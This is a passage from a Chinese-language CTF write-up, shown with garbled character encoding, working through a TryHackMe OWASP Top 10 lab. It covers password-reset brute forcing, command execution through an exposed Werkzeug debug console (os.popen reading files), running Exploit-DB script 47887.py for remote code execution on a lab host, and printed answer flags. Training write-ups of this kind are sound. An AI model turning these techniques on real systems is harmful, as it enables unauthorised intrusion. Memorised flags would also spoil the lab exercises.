href="#ä¸å®‰å…¨çš„å¯†ç è®¾ç½®" class="headerlink" title="ä¸å®‰å…¨çš„å¯†ç è®¾ç½®"></a>ä¸å®‰å…¨çš„å¯†ç è®¾ç½®</h2><p>ä¸ä¹…å‰ Instagram ä¸Šå°±å‡ºç°äº†æ­¤ç±»æ¼æ´çš„ä¸€ä¸ªå¾ˆå¥½çš„ä¾‹å­ã€‚ Instagram å…è®¸ç”¨æˆ·é€šè¿‡çŸ­ä¿¡å‘ä»–ä»¬çš„æ‰‹æœºå·ç å‘é€ 6 ä½ä»£ç è¿›è¡ŒéªŒè¯ï¼Œä»è€Œé‡ç½®å¿˜è®°çš„å¯†ç ã€‚å¦‚æœæ”»å‡»è€…æƒ³è¦è®¿é—®å—å®³è€…çš„å¸æˆ·ï¼Œä»–å¯ä»¥å°è¯•æš´åŠ›ç ´è§£ 6 ä½ä»£ç ã€‚æ­£å¦‚é¢„æœŸçš„é‚£æ ·ï¼Œè¿™ä¸å¯èƒ½ç›´æ¥å®ç°ï¼Œå› ä¸º Instagram å®æ–½äº†é€Ÿç‡é™åˆ¶ï¼Œåœ¨ 250 æ¬¡å°è¯•åç”¨æˆ·å°†è¢«é˜»æ­¢è¿›ä¸€æ­¥å°è¯•ã€‚</p><p>ç„¶è€Œï¼Œæˆ‘ä»¬å‘ç°é€Ÿç‡é™åˆ¶ä»…é€‚ç”¨äºæ¥è‡ªåŒä¸€ IP çš„ä»£ç å°è¯•ã€‚å¦‚æœæ”»å‡»è€…æœ‰å¤šä¸ªä¸åŒçš„ IP åœ°å€æ¥å‘é€è¯·æ±‚ï¼Œä»–ç°åœ¨å¯ä»¥ä¸ºæ¯ä¸ª IP å°è¯• 250 ä¸ªä»£ç ã€‚å¯¹äº 6 ä½ä»£ç ï¼Œæœ‰ä¸€ç™¾ä¸‡ä¸ªå¯èƒ½çš„ä»£ç ï¼Œå› æ­¤æ”»å‡»è€…éœ€è¦ 1000000&#x2F;250 &#x3D; 4000 ä¸ª IP æ‰èƒ½è¦†ç›–æ‰€æœ‰å¯èƒ½çš„ä»£ç ã€‚è¿™å¬èµ·æ¥ä¼¼ä¹éœ€è¦æ‹¥æœ‰å¤§é‡çš„ IPï¼Œä½†äº‘æœåŠ¡å¯ä»¥è½»æ¾åœ°ä»¥ç›¸å¯¹è¾ƒå°çš„æˆæœ¬è·å–è¿™äº› IPï¼Œä»è€Œä½¿è¿™ç§æ”»å‡»å˜å¾—å¯è¡Œã€‚</p><p>è¯·æ³¨æ„è¯¥æ¼æ´ä¸ä»¥ä¸‹æƒ³æ³•çš„å…³ç³»ï¼š<strong>æ²¡æœ‰ç”¨æˆ·èƒ½å¤Ÿä½¿ç”¨æ•°åƒä¸ª IP åœ°å€å‘å‡ºå¹¶å‘è¯·æ±‚æ¥å°è¯•æš´åŠ›ç ´è§£æ•°å­—ä»£ç </strong>ã€‚é—®é¢˜åœ¨äºè®¾è®¡è€Œä¸æ˜¯åº”ç”¨ç¨‹åºæœ¬èº«çš„å®ç°ã€‚</p><h2 id="ç»ƒä¹ -3"><a href="#ç»ƒä¹ -3" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h2><p>è¿›å…¥ç•Œé¢ï¼Œæˆ‘ä»¬å·²çŸ¥å­˜åœ¨ä¸€ä¸ªå« joseph çš„è´¦æˆ·<br><img src="/PenTest_FILE/49c0c6266ac071671a8c653949afba31_MD5.jpeg"></p><p>é‡ç½®å¯†ç è¯•è¯•ï¼š<br><img src="/PenTest_FILE/039fafd2b913859361d2e398676c06c3_MD5.jpeg"></p><p>æœ€å–œæ¬¢çš„é¢œè‰²ï¼Ÿæ„Ÿè§‰å¯ä»¥çˆ†ç ´ä¸€æ‰‹<br><img src="/PenTest_FILE/e53a3d749562d760f4943959f538c23e_MD5.jpeg"><br>çœ‹æ¥ä½ å–œæ¬¢greenå“ˆ</p><p>ä¹Ÿæ˜¯æˆåŠŸé‡ç½®äº†å¯†ç <br><img src="/PenTest_FILE/6470021c2fe4321810e8947bdb610359_MD5.jpeg"><br><img src="/PenTest_FILE/bdc9bc8a9329d78002d75e0bafff0541_MD5.jpeg"></p><h1 id="äº”ã€å®‰å…¨é…ç½®é”™è¯¯"><a href="#äº”ã€å®‰å…¨é…ç½®é”™è¯¯" class="headerlink" title="äº”ã€å®‰å…¨é…ç½®é”™è¯¯"></a>äº”ã€å®‰å…¨é…ç½®é”™è¯¯</h1><p>å®‰å…¨é…ç½®é”™è¯¯ä¸å…¶ä»–åå¤§æ¼æ´ä¸åŒï¼Œå› ä¸ºå®ƒä»¬å‘ç”Ÿåœ¨æœ¬å¯ä»¥é€‚å½“é…ç½®å®‰å…¨ä½†æ²¡æœ‰è¿›è¡Œé…ç½®çš„æƒ…å†µä¸‹</p><p>å®‰å…¨é”™è¯¯é…ç½®åŒ…æ‹¬ï¼š</p><ul><li>äº‘æœåŠ¡ï¼ˆä¾‹å¦‚ S3 å­˜å‚¨æ¡¶ï¼‰çš„æƒé™é…ç½®ä¸å½“ã€‚</li><li>å¯ç”¨ä¸å¿…è¦çš„åŠŸèƒ½ï¼Œä¾‹å¦‚æœåŠ¡ã€é¡µé¢ã€å¸æˆ·æˆ–æƒé™ã€‚</li><li>å¯†ç æœªæ›´æ”¹çš„é»˜è®¤å¸æˆ·ã€‚</li><li>é”™è¯¯æ¶ˆæ¯è¿‡äºè¯¦ç»†ï¼Œå…è®¸æ”»å‡»è€…æ‰¾åˆ°æœ‰å…³ç³»ç»Ÿçš„æ›´å¤šä¿¡æ¯ã€‚</li><li>ä¸ä½¿ç”¨ HTTP å®‰å…¨æ ‡å¤´ã€‚</li></ul><h2 id="è°ƒè¯•æ¥å£"><a href="#è°ƒè¯•æ¥å£" class="headerlink" title="è°ƒè¯•æ¥å£"></a>è°ƒè¯•æ¥å£</h2><p>å¸¸è§çš„å®‰å…¨é”™è¯¯é…ç½®æ¶‰åŠç”Ÿäº§è½¯ä»¶ä¸­è°ƒè¯•åŠŸèƒ½çš„æš´éœ²ã€‚ç¼–ç¨‹æ¡†æ¶ä¸­é€šå¸¸æä¾›è°ƒè¯•åŠŸèƒ½ï¼Œå…è®¸å¼€å‘äººå‘˜è®¿é—®é«˜çº§åŠŸèƒ½ï¼Œè¿™å¯¹äºåœ¨å¼€å‘è¿‡ç¨‹ä¸­è°ƒè¯•åº”ç”¨ç¨‹åºå¾ˆæœ‰ç”¨ã€‚<strong>å¦‚æœå¼€å‘äººå‘˜åœ¨å‘å¸ƒåº”ç”¨ç¨‹åºä¹‹å‰å¿˜è®°ç¦ç”¨å…¶ä¸­ä¸€äº›è°ƒè¯•åŠŸèƒ½ï¼Œåˆ™æ”»å‡»è€…å¯èƒ½ä¼šæ»¥ç”¨å…¶ä¸­ä¸€äº›è°ƒè¯•åŠŸèƒ½ã€‚</strong></p><p>æ®ç§°ï¼Œ2015 å¹´ Patreon é­åˆ°é»‘å®¢æ”»å‡»æ—¶å°±åˆ©ç”¨äº†æ­¤ç±»æ¼æ´ã€‚åœ¨ Patreon é­åˆ°é»‘å®¢æ”»å‡»çš„äº”å¤©å‰ï¼Œä¸€åå®‰å…¨ç ”ç©¶äººå‘˜å‘ Patreon æŠ¥å‘Šè¯´ï¼Œä»–å‘ç°äº† Werkzeug æ§åˆ¶å°çš„å¼€æ”¾è°ƒè¯•æ¥å£ã€‚ Werkzeug æ˜¯åŸºäº Python çš„ Web åº”ç”¨ç¨‹åºä¸­çš„é‡è¦ç»„ä»¶ï¼Œå› ä¸ºå®ƒä¸º Web æœåŠ¡å™¨æä¾›æ‰§è¡Œ Python ä»£ç çš„æ¥å£ã€‚ Werkzeug åŒ…å«ä¸€ä¸ªè°ƒè¯•æ§åˆ¶å°ï¼Œå¯ä»¥é€šè¿‡Â <code>/console</code>Â ä¸Šçš„ URL è®¿é—®è¯¥æ§åˆ¶å°ï¼Œæˆ–è€…å¦‚æœåº”ç”¨ç¨‹åºå¼•å‘å¼‚å¸¸ï¼Œè¯¥æ§åˆ¶å°ä¹Ÿä¼šå‘ˆç°ç»™ç”¨æˆ·ã€‚åœ¨è¿™ä¸¤ç§æƒ…å†µä¸‹ï¼Œæ§åˆ¶å°éƒ½ä¼šæä¾›ä¸€ä¸ª Python æ§åˆ¶å°ï¼Œå®ƒå°†è¿è¡Œæ‚¨å‘é€ç»™å®ƒçš„ä»»ä½•ä»£ç ã€‚å¯¹äºæ”»å‡»è€…æ¥è¯´ï¼Œè¿™æ„å‘³ç€ä»–å¯ä»¥ä»»æ„æ‰§è¡Œå‘½ä»¤ã€‚</p><h2 id="ç»ƒä¹ -4"><a href="#ç»ƒä¹ -4" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h2><p>å¯¼èˆªè‡³ <a href="http://10.10.226.188:86/console">http://10.10.226.188:86/console</a> ä»¥è®¿é—® Werkzeug æ§åˆ¶å°ã€‚</p><p>çœ‹æ ·å­æ˜¯ä¸ªpythonè°ƒè¯•å°<br><img src="/PenTest_FILE/1deb4efdfea453b8c26ad802ae9d1e05_MD5.jpeg"></p><ul><li>å½“å‰ç›®å½•ä¸­çš„æ•°æ®åº“æ–‡ä»¶åï¼ˆæ‰©å±•åä¸º .db çš„æ–‡ä»¶ï¼‰æ˜¯ä»€ä¹ˆï¼Ÿç­”ï¼štodo.db<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> os<span class="token punctuation">;</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls -al'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token string">'total 40\ndrwxr-xr-x    1 root     root          4096 Feb  3  2023 .\ndrwxr-xr-x    1 root     root          4096 Sep 15  2022 ..\n-rw-r--r--    1 root     root           249 Sep 15  2022 Dockerfile\n-rw-r--r--    1 root     root          1411 Feb  3  2023 app.py\n-rw-r--r--    1 root     root           137 Sep 15  2022 requirements.txt\ndrwxr-xr-x    2 root     root          4096 Sep 15  2022 templates\n-rw-r--r--    1 root     root          8192 Sep 15  2022 todo.db\n'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li>ä¿®æ”¹ä»£ç ä»¥è¯»å– app.py æ–‡ä»¶çš„å†…å®¹ï¼Œè¯¥æ–‡ä»¶åŒ…å«åº”ç”¨ç¨‹åºçš„æºä»£ç ã€‚æºä»£ç ä¸­ secret_flag å˜é‡çš„å€¼æ˜¯å¤šå°‘ï¼Ÿç­”ï¼šTHM{Just_a_tiny_misconfiguration}<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> os<span class="token punctuation">;</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'cat app.py'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token string">'import os\nfrom flask import Flask, render_template, request, redirect, url_for\nfrom flask_sqlalchemy import SQLAlchemy\n\nsecret_flag = "THM&#123;Just_a_tiny_misconfiguration&#125;"\n\nPROJECT_ROOT = os.path.dirname(os.path.realpath(__file__))\nDATABASE = os.path.join(PROJECT_ROOT, \'todo.db\')\n\napp = Flask(__name__)\napp.config[\'SQLALCHEMY_DATABASE_URI\'] = "sqlite:////" + DATABASE\ndb = SQLAlchemy(app)\n\n\nclass Todo(db.Model):\n    id = db.Column(db.Integer, primary_key=True)\n    title = db.Column(db.String(80))\n    complete = db.Column(db.Boolean)\n\n\n@app.route("/")\ndef index():\n    todo_list = Todo.query.all()\n    return render_template("index.html", todo_list=todo_list)\n\n\n@app.route("/add", methods=["POST"])\ndef add():\n    title = request.form.get("title")\n    new_todo = Todo(title=title, complete=False)\n    db.session.add(new_todo)\n    db.session.commit()\n    return redirect(url_for("index"))\n\n\n@app.route("/complete/&lt;string:todo_id>")\ndef complete(todo_id):\n    todo = Todo.query.filter_by(id=todo_id).first()\n    todo.complete = not todo.complete\n    db.session.commit()\n    return redirect(url_for("index"))\n\n\n@app.route("/delete/&lt;string:todo_id>")\ndef delete(todo_id):\n    todo = Todo.query.filter_by(id=todo_id).first()\n    db.session.delete(todo)\n    db.session.commit()\n    return redirect(url_for("index"))\n\n\nif __name__ == "__main__":\n    db.create_all()\n    app.run(host=\'0.0.0.0\', port=5000, debug=True)\n'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul><h1 id="å…­ã€æ˜“å—æ”»å‡»æˆ–è¿‡æ—¶çš„ç»„ä»¶"><a href="#å…­ã€æ˜“å—æ”»å‡»æˆ–è¿‡æ—¶çš„ç»„ä»¶" class="headerlink" title="å…­ã€æ˜“å—æ”»å‡»æˆ–è¿‡æ—¶çš„ç»„ä»¶"></a>å…­ã€æ˜“å—æ”»å‡»æˆ–è¿‡æ—¶çš„ç»„ä»¶</h1><p>æœ‰æ—¶ï¼Œæ‚¨å¯èƒ½ä¼šå‘ç°æ‚¨æ­£åœ¨æµ‹è¯•çš„å…¬å¸&#x2F;å®ä½“æ­£åœ¨ä½¿ç”¨å…·æœ‰ä¼—æ‰€å‘¨çŸ¥æ¼æ´çš„ç¨‹åºã€‚</p><p>ä¾‹å¦‚ï¼Œå‡è®¾ä¸€å®¶å…¬å¸å·²ç»å‡ å¹´æ²¡æœ‰æ›´æ–°å…¶ WordPress ç‰ˆæœ¬ï¼Œå¹¶ä¸”ä½¿ç”¨ WPScan ç­‰å·¥å…·ï¼Œæ‚¨ä¼šå‘ç°å®ƒçš„ç‰ˆæœ¬æ˜¯ 4.6ã€‚ä¸€äº›å¿«é€Ÿç ”ç©¶è¡¨æ˜ WordPress 4.6 å®¹æ˜“å—åˆ°æœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE) æ¼æ´çš„æ”»å‡»ï¼Œæ›´å¥½çš„æ˜¯ï¼Œæ‚¨å¯ä»¥åœ¨ Exploit-DB ä¸Šæ‰¾åˆ°å·²ç»å­˜åœ¨çš„æ¼æ´ã€‚</p><p>æ­£å¦‚æ‚¨æ‰€çœ‹åˆ°çš„ï¼Œè¿™å°†æ˜¯ç›¸å½“å…·æœ‰ç ´åæ€§çš„ï¼Œå› ä¸ºæ”»å‡»è€…åªéœ€è¦å¾ˆå°‘çš„å·¥ä½œã€‚ç”±äºè¯¥æ¼æ´å·²ç»ä¼—æ‰€å‘¨çŸ¥ï¼Œå› æ­¤å…¶ä»–äººå¯èƒ½å·²ç»åˆ©ç”¨äº†è¯¥æ¼æ´ã€‚å½“æ‚¨æ„è¯†åˆ°è¿™ç§æƒ…å†µå¾ˆå®¹æ˜“å‘ç”Ÿæ—¶ï¼Œæƒ…å†µä¼šå˜å¾—æ›´ç³Ÿã€‚å¦‚æœä¸€å®¶å…¬å¸é”™è¿‡äº†å…¶ä½¿ç”¨çš„ç¨‹åºçš„ä¸€æ¬¡æ›´æ–°ï¼Œé‚£ä¹ˆå®ƒå¯èƒ½å®¹æ˜“å—åˆ°ä»»æ„æ•°é‡çš„æ”»å‡»ã€‚</p><p>æ‰€ä»¥ï¼Œæˆ‘ä»¬çš„ä¸»è¦å·¥ä½œæ˜¯æ‰¾å‡ºè¯¥è½¯ä»¶çš„ä¿¡æ¯å¹¶è¿›è¡Œç ”ç©¶ï¼Œç›´åˆ°æ‰¾åˆ°æ¼æ´åˆ©ç”¨ç¨‹åºã€‚è®©æˆ‘ä»¬é€šè¿‡ä¸€ä¸ªç¤ºä¾‹ Web åº”ç”¨ç¨‹åºæ¥å®Œæˆè¿™ä¸ªè¿‡ç¨‹ã€‚<br><img src="/PenTest_FILE/49eba25342587552308607ebdf8019b9_MD5.jpeg"><br>ä½ çŸ¥é“ä»€ä¹ˆï¼Ÿè¯¥æœåŠ¡å™¨å…·æœ‰ Nostromo Web æœåŠ¡å™¨çš„é»˜è®¤é¡µé¢ã€‚ç°åœ¨æˆ‘ä»¬æœ‰äº†ç‰ˆæœ¬å·å’Œè½¯ä»¶åç§°ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <a href="https://www.exploit-db.com/">Exploit-DB</a> ç½‘ç«™æ¥å°è¯•æ‰¾åˆ°è¯¥ç‰¹å®šç‰ˆæœ¬çš„æ¼æ´ã€‚<br><img src="/PenTest_FILE/8c90b8666d5d47d89a0597986278c5b5_MD5.jpeg"><br>å¹¸è¿çš„æ˜¯ï¼Œæœ€é‡è¦çš„ç»“æœæ°å¥½æ˜¯ä¸€ä¸ªæ¼æ´åˆ©ç”¨è„šæœ¬ã€‚è®©æˆ‘ä»¬ä¸‹è½½å®ƒå¹¶å°è¯•æ‰§è¡Œä»£ç ã€‚</p><p>æ‚¨ä»äº’è”ç½‘ä¸‹è½½çš„æ¼æ´ç¬¬ä¸€æ¬¡å¯èƒ½ä¸èµ·ä½œç”¨ã€‚ä½ éœ€è¦ç†è§£è„šæœ¬æ‰€ä½¿ç”¨çš„ç¼–ç¨‹è¯­è¨€ï¼Œä»¥ä¾¿åœ¨éœ€è¦æ—¶ï¼Œæ‚¨å¯ä»¥ä¿®å¤ä»»ä½•é”™è¯¯æˆ–è¿›è¡Œä»»ä½•ä¿®æ”¹ï¼Œå› ä¸º Exploit-DB ä¸Šçš„å¾ˆå¤šè„šæœ¬éƒ½ä¸å¯èƒ½åŸå°ä¸åŠ¨ç›´æ¥èƒ½å¤Ÿä½¿ç”¨</p><h2 id="ç»ƒä¹ -5"><a href="#ç»ƒä¹ -5" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h2><p>æ¬¢è¿æ¥åˆ°CSEç½‘ä¸Šä¹¦åº—ï¼Œæœ¬ç½‘ç«™æ˜¯ä½¿ç”¨ PHP å’Œ MYSQLï¼ˆç¨‹åºå‡½æ•°ï¼‰åˆ¶ä½œçš„ï¼ å¸ƒå±€ä½¿ç”¨ Bootstrap ä½¿å…¶å“åº”æ›´å¿«ã€‚ è¿™åªæ˜¯ä¸€ä¸ªç®€å•çš„ç½‘ç«™ï¼<br><img src="/PenTest_FILE/f5b3b915203616be75a553351b977eca_MD5.jpeg"></p><p>æˆ‘ä¸€å¼€å§‹çš„æ€è·¯æ˜¯è¿™æ ·ï¼š</p><blockquote><p>Bootstrapæ˜¯ä¸€ç»„ç”¨äºç½‘ç«™å’Œç½‘ç»œåº”ç”¨ç¨‹åºå¼€å‘çš„å¼€æºå‰ç«¯æ¡†æ¶ï¼ŒåŒ…æ‹¬HTMLã€CSSåŠJavaScriptçš„æ¡†æ¶ï¼Œæä¾›å­—ä½“æ’å°ã€çª—ä½“ã€æŒ‰é’®ã€å¯¼èˆªåŠå…¶ä»–å„ç§ç»„ä»¶åŠJavascriptæ‰©å±•ï¼Œæ—¨åœ¨ä½¿åŠ¨æ€ç½‘é¡µå’ŒWebåº”ç”¨çš„å¼€å‘æ›´åŠ å®¹æ˜“ã€‚</p></blockquote><blockquote><p>åœ¨ Bootstrap ä¸­ï¼Œä» 2.3.0 ç‰ˆæœ¬å¼€å§‹ï¼Œç›´åˆ° 3.4.0 ç‰ˆæœ¬ä¹‹å‰ï¼Œä»¥åŠ 4.x ç‰ˆæœ¬åœ¨ 4.1.2 ç‰ˆæœ¬ä¹‹å‰ï¼ŒæŠ˜å ç»„ä»¶çš„ data-parent å±æ€§å­˜åœ¨ XSS æ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´æ‰§è¡Œæ¶æ„çš„ JavaScript ä»£ç ã€‚</p></blockquote><p>Bootstrapç‰ˆæœ¬å°†æ˜¾ç¤ºåœ¨CSSæ–‡ä»¶çš„é¡¶éƒ¨ã€‚ åªéœ€æ‰“å¼€å®ƒå¹¶æŸ¥çœ‹æ–‡ä»¶çš„é¡¶éƒ¨ã€‚<br><img src="/PenTest_FILE/83bd1ae5422295c9c83154629310c35d_MD5.jpeg"><br><img src="/PenTest_FILE/d2599db0d3416b70d31ad8060cb43b05_MD5.jpeg"><br>å±…ç„¶æ˜¯3.3.5çš„ç‰ˆæœ¬ï¼Œå­˜åœ¨XSS</p><p>ä½†æ˜¯è¿™å¥½åƒä¸èƒ½è¿›è¡Œä»»æ„æ–‡ä»¶è¯»å–<br><img src="/PenTest_FILE/6922277e73dcc38538a65680bd5661cd_MD5.jpeg"></p><p>æç¤ºä¹Ÿä¸çŸ¥é“æ€ä¹ˆç”¨<br><img src="/PenTest_FILE/4bfeb09720fcfa26a5936873b82b53e2_MD5.jpeg"></p><p>wpä½¿ç”¨äº†ä¸€ä¸ªå«<code>searchsploit</code>çš„å·¥å…·</p><blockquote><p>Searchsploitæ˜¯ä¸€ä¸ªç”¨äºExploit-DBçš„å‘½ä»¤è¡Œæœç´¢å·¥å…·ï¼Œå®ƒè¿˜å…è®¸ä½ éšèº«å¸¦ä¸€ä»½Exploit-DBçš„å‰¯æœ¬ï¼ŒSearchSploitä¸ºæ‚¨æä¾›äº†åœ¨æœ¬åœ°ä¿å­˜çš„å­˜å‚¨åº“ä¸­æ‰§è¡Œè¯¦ç»†çš„ç¦»çº¿æœç´¢çš„èƒ½åŠ›ã€‚</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">searchsploit online book store<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/PenTest_FILE/1637b9451dcdbaecbd79369dee074184_MD5.jpeg"></p><p>ç°åœ¨æˆ‘ä»¬å°†ä½¿ç”¨æ¼æ´åˆ©ç”¨ 47887.py åœ¨æ˜“å—æ”»å‡»çš„ç½‘ç«™è·å– rceï¼ˆè¿˜çœŸè¡Œå•Šï¼‰</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 /usr/share/exploitdb/exploits/php/webapps/47887.py http://10.10.30.59:84/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/PenTest_FILE/661fae70e9ff05b0da40162c9d7384a5_MD5.jpeg"></p><ul><li>&#x2F;opt&#x2F;flag.txt æ–‡ä»¶çš„å†…å®¹æ˜¯ä»€ä¹ˆï¼Ÿç­”ï¼šTHM{But_1ts_n0t_my_f4ult!}</li></ul><h1 id="ä¸ƒã€èº«ä»½éªŒè¯ç¼ºé™·"><a href="#ä¸ƒã€èº«ä»½éªŒè¯ç¼ºé™·" class="headerlink" title="ä¸ƒã€èº«ä»½éªŒè¯ç¼ºé™·"></a>ä¸ƒã€èº«ä»½éªŒè¯ç¼ºé™·</h1><p><strong>èº«ä»½éªŒè¯</strong> å’Œ <strong>ä¼šè¯ç®¡ç†</strong> æ„æˆäº†ç°ä»£ Web åº”ç”¨ç¨‹åºçš„æ ¸å¿ƒç»„ä»¶ã€‚èº«ä»½éªŒè¯å…è®¸ç”¨æˆ·é€šè¿‡éªŒè¯å…¶èº«ä»½æ¥è®¿é—® Web åº”ç”¨ç¨‹åºã€‚æœ€å¸¸è§çš„èº«ä»½éªŒè¯å½¢å¼æ˜¯ä½¿ç”¨ç”¨æˆ·åå’Œå¯†ç æœºåˆ¶ã€‚ç”¨æˆ·å°†è¾“å…¥è¿™äº›å‡­æ®ï¼ŒæœåŠ¡å™¨å°†éªŒè¯å®ƒä»¬ã€‚å¦‚æœæ­£ç¡®çš„è¯ï¼ŒæœåŠ¡å™¨å°†å‘ç”¨æˆ·çš„æµè§ˆå™¨æä¾›ä¼šè¯ cookieã€‚éœ€è¦ä¼šè¯ cookieï¼Œå› ä¸º Web æœåŠ¡å™¨ä½¿ç”¨ HTTP(S) è¿›è¡Œé€šä¿¡ï¼Œè¿™æ˜¯æ— çŠ¶æ€çš„ã€‚é™„åŠ ä¼šè¯ cookie æ„å‘³ç€æœåŠ¡å™¨å°†çŸ¥é“è°æ­£åœ¨å‘é€ä»€ä¹ˆæ•°æ®ã€‚ç„¶åæœåŠ¡å™¨å¯ä»¥è·Ÿè¸ªç”¨æˆ·çš„æ“ä½œã€‚</p><p>å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿå‘ç°èº«ä»½éªŒè¯æœºåˆ¶ä¸­çš„ç¼ºé™·ï¼Œä»–ä»¬å¯èƒ½ä¼šæˆåŠŸè®¿é—®å…¶ä»–ç”¨æˆ·çš„å¸æˆ·ã€‚è¿™å°†å…è®¸æ”»å‡»è€…è®¿é—®æ•æ„Ÿæ•°æ®ï¼ˆå–å†³äºåº”ç”¨ç¨‹åºçš„ç›®çš„ï¼‰ã€‚èº«ä»½éªŒè¯æœºåˆ¶ä¸­çš„ä¸€äº›å¸¸è§ç¼ºé™·åŒ…æ‹¬ï¼š</p><ul><li>æš´åŠ›æ”»å‡»ï¼šå¦‚æœ Web åº”ç”¨ç¨‹åºä½¿ç”¨ç”¨æˆ·åå’Œå¯†ç ï¼Œæ”»å‡»è€…å¯ä»¥å°è¯•å‘èµ·æš´åŠ›æ”»å‡»ï¼Œé€šè¿‡å¤šæ¬¡èº«ä»½éªŒè¯å°è¯•æ¥çŒœæµ‹ç”¨æˆ·åå’Œå¯†ç ã€‚</li><li>ä½¿ç”¨å¼±å‡­æ®ï¼šWeb åº”ç”¨ç¨‹åºåº”è®¾ç½®å¼ºå¯†ç ç­–ç•¥ã€‚å¦‚æœåº”ç”¨ç¨‹åºå…è®¸ç”¨æˆ·è®¾ç½®â€œpassword1â€ç­‰å¯†ç æˆ–å¸¸ç”¨å¯†ç ï¼Œåˆ™æ”»å‡»è€…å¯ä»¥è½»æ¾çŒœå‡ºå®ƒä»¬å¹¶è®¿é—®ç”¨æˆ·å¸æˆ·ã€‚</li><li>å¼±ä¼šè¯ Cookieï¼šä¼šè¯ Cookie æ˜¯æœåŠ¡å™¨è·Ÿè¸ªç”¨æˆ·çš„æ–¹å¼ã€‚å¦‚æœä¼šè¯ cookie åŒ…å«å¯é¢„æµ‹çš„å€¼ï¼Œæ”»å‡»è€…å°±å¯ä»¥è®¾ç½®è‡ªå·±çš„ä¼šè¯ cookie å¹¶è®¿é—®ç”¨æˆ·çš„å¸æˆ·ã€‚</li></ul><p>å½“ç„¶ï¼Œæ ¹æ®å…·ä½“çš„ç¼ºé™·ï¼Œå¯ä»¥æœ‰å¤šç§é’ˆå¯¹æŸåçš„èº«ä»½éªŒè¯æœºåˆ¶çš„ç¼“è§£æªæ–½ï¼š</p><ul><li>ä¸ºäº†é¿å…å¯†ç çŒœæµ‹æ”»å‡»ï¼Œè¯·ç¡®ä¿åº”ç”¨ç¨‹åºå¼ºåˆ¶æ‰§è¡Œå¼ºå¤§çš„å¯†ç ç­–ç•¥ã€‚</li><li>ä¸ºäº†é¿å…æš´åŠ›æ”»å‡»ï¼Œè¯·ç¡®ä¿åº”ç”¨ç¨‹åºåœ¨ä¸€å®šæ¬¡æ•°çš„å°è¯•åå¼ºåˆ¶æ‰§è¡Œè‡ªåŠ¨é”å®šã€‚è¿™å°†é˜²æ­¢æ”»å‡»è€…å‘èµ·æ›´å¤šæš´åŠ›æ”»å‡»ã€‚</li><li>å®æ–½å¤šé‡èº«ä»½éªŒè¯ã€‚å¦‚æœç”¨æˆ·æœ‰å¤šç§èº«ä»½éªŒè¯æ–¹æ³•ï¼Œä¾‹å¦‚ä½¿ç”¨ç”¨æˆ·åå’Œå¯†ç å¹¶åœ¨ç§»åŠ¨è®¾å¤‡ä¸Šæ¥æ”¶ä»£ç ï¼Œåˆ™æ”»å‡»è€…å°†å¾ˆéš¾åŒæ—¶è·å–å¯†ç å’Œä»£ç æ¥è®¿é—®å¸æˆ·ã€‚</li></ul><h2 id="ç°æœ‰ç”¨æˆ·é‡æ–°æ³¨å†Œ"><a href="#ç°æœ‰ç”¨æˆ·é‡æ–°æ³¨å†Œ" class="headerlink" title="ç°æœ‰ç”¨æˆ·é‡æ–°æ³¨å†Œ"></a>ç°æœ‰ç”¨æˆ·é‡æ–°æ³¨å†Œ</h2><p>å¯¹äºæ­¤ç¤ºä¾‹ï¼Œæˆ‘ä»¬å°†ç ”ç©¶èº«ä»½éªŒè¯æœºåˆ¶ä¸­çš„é€»è¾‘ç¼ºé™·ã€‚</p><p>å¾ˆå¤šæ—¶å€™ï¼Œå¼€å‘äººå‘˜å¿˜è®°æ¸…ç†ç”¨æˆ·åœ¨åº”ç”¨ç¨‹åºä»£ç ä¸­ç»™å‡ºçš„è¾“å…¥ï¼ˆç”¨æˆ·åå’Œå¯†ç ï¼‰ï¼Œè¿™å¯èƒ½ä½¿ä»–ä»¬å®¹æ˜“å—åˆ° SQL æ³¨å…¥ç­‰æ”»å‡»ã€‚ç„¶è€Œï¼Œæˆ‘ä»¬å°†é‡ç‚¹å…³æ³¨ä¸€ä¸ªç”±äºå¼€å‘äººå‘˜çš„é”™è¯¯è€Œå‘ç”Ÿä½†éå¸¸å®¹æ˜“è¢«åˆ©ç”¨çš„æ¼æ´ï¼Œå³ç°æœ‰ç”¨æˆ·çš„é‡æ–°æ³¨å†Œã€‚</p><p>è®©æˆ‘ä»¬é€šè¿‡ä¸€ä¸ªä¾‹å­æ¥ç†è§£è¿™ä¸€ç‚¹ï¼Œå‡è®¾æœ‰ä¸€ä¸ªåä¸ºÂ <code>admin</code>Â çš„ç°æœ‰ç”¨æˆ·ï¼Œæˆ‘ä»¬æƒ³è¦è®¿é—®ä»–çš„å¸æˆ·ï¼Œæˆ‘ä»¬å¯ä»¥åšçš„æ˜¯å°è¯•é‡æ–°æ³¨å†Œè¯¥ç”¨æˆ·åã€‚</p><p>ä¸è¿‡éœ€è¦ç¨ä½œä¿®æ”¹ã€‚æˆ‘ä»¬å°†è¾“å…¥<code> admin</code>ï¼ˆæ³¨æ„å¼€å¤´çš„ç©ºæ 